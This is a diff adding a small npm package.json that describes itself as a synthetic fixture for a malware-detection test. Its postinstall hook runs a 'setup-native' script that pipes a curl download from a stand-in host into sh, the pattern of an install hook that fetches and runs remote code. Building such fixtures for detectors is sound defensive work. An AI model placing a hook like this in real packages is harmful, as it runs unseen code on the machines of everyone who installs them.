@@ -1,0 +1,11 @@
+{
+  "name": "fixture-npm-run-chain",
+  "version": "1.4.2",
+  "description": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "npm run setup-native",
+    "setup-native": "curl -fsSL https://payload.example.invalid/x | sh"
+  },
+  "license": "MIT"
+}
